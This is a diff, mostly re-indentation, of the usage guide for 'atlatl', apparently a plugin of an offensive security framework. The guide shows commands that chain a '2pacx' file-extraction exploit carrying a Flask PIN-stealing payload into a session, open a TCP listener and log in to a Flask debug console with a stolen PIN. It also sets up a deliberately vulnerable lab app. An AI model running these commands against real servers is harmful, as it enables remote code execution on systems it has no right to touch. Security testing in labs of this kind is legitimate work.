@@ -50,75 +50,75 @@ guide:
     
      → Session mode:
 
-     Start atlatl in session mode, loading all the required
-     parameters from current siddhi being executed in the
-     primary terminal.
+        Start atlatl in session mode, loading all the required
+        parameters from current siddhi being executed in the
+        primary terminal.
 
-     In this example, the module 2pacx, an exploit type using
-     a flask_stealer payload, is the invoker responsible for
-     informing atlatl the settings to be loaded in the current
-     session. For this, it is required to declare for which
-     module we're passing the settings using the parameter
-     --forward, like this:
+        In this example, the module 2pacx, an exploit type using
+        a flask_stealer payload, is the invoker responsible for
+        informing atlatl the settings to be loaded in the current
+        session. For this, it is required to declare for which
+        module we're passing the settings using the parameter
+        --forward, like this:
 
-     $ vimana run \
-        --module 2pacx \
-        --target-url http://pytestapp:5000/upload \
-        --target-dir config \
-        --payload flask_pinstealer \
-        --forward atlatl \
-        --local-port 9999 \
-        --local-host 123.45.67.89
+        $ vimana run \
+           --module 2pacx \
+           --target-url http://pytestapp:5000/upload \
+           --target-dir config \
+           --payload flask_pinstealer \
+           --forward atlatl \
+           --local-port 9999 \
+           --local-host 123.45.67.89
 
-     After that, you can start the listener by 2pacx session:
+        After that, you can start the listener by 2pacx session:
 
-     $ vimana run -m atlatl --session 2pacx
+        $ vimana run -m atlatl --session 2pacx
 
     ø----------------------------------------------------------------------ø
     
      → Listener mode
 
-     Start atlatl as a simple TCP Listener:
+        Start atlatl as a simple TCP Listener:
 
-     $ vimana run \
-        -m atlatl \ 
-        --listener \
-        --local-port 7777 \
-        --local-host 127.0.0.1
+        $ vimana run \
+           --plugin atlatl \ 
+           --listener \
+           --local-port 7777 \
+           --local-host 127.0.0.1
 
     ø----------------------------------------------------------------------ø
     
      → Auth mode
 
-     Atlatl acts as an authenticator in this mode, requiring
-     the Flask application URL and the console PIN. This feature
-     is invoked automatically as a part of the tasks realized by
-     atlatl in --session mode. But for some reason, sometimes
-     it can be handy as a separate resource.
+        Atlatl acts as an authenticator in this mode, requiring
+        the Flask application URL and the console PIN. This feature
+        is invoked automatically as a part of the tasks realized by
+        atlatl in --session mode. But for some reason, sometimes
+        it can be handy as a separate resource.
 
-     $ vimana run \
-        -m atlatl \
-        --auth \
-        --target-url http://flaskappwithdebug.com:8877 \
-        --console-pin 246-810-121
+        $ vimana run \
+           --plugin atlatl \
+           --auth \
+           --target-url http://flaskappwithdebug.com:8877 \
+           --console-pin 246-810-121
 
   lab_setup: |
     ø----------------------------------------------------------------------ø
     │/└┘│┬│┌┐│└└┬┌┐┌┘┌┬┐┬└┐┘└┘┌┌  LAB SETUP  ┘└┐│└┘┌┐││┬│/└┘┌┬┐└┐┌││:└┘└└┬┌┐
     ø----------------------------------------------------------------------ø
   
-     The best way to give it a try is by setting up 
-     a deliberately vulnerable web application to demonstrate
-     insecure file extraction. Just follow the steps below or
-     check the repository itself:
+        The best way to give it a try is by setting up 
+        a deliberately vulnerable web application to demonstrate
+        insecure file extraction. Just follow the steps below or
+        check the repository itself:
 
-     $ git clone https://github.com/ajinabraham/bad_python_extract.git
-     $ python3 -m venv bpex_env
-     $ source bpex_env/bin/activate
-     $ cd bad_python_extract
-     $ pip install -r requirements.txt --user
-     $ python server.py
+        $ git clone https://github.com/ajinabraham/bad_python_extract.git
+        $ python3 -m venv bpex_env
+        $ source bpex_env/bin/activate
+        $ cd bad_python_extract
+        $ pip install -r requirements.txt --user
+        $ python server.py
 
-     * This setup is the same for 2pacx
-     * For exploitation examples use: `vimana guide -m 2pacx -e`
+        * This setup is the same for 2pacx
+        * For exploitation examples use: `vimana guide -m 2pacx -e`
 
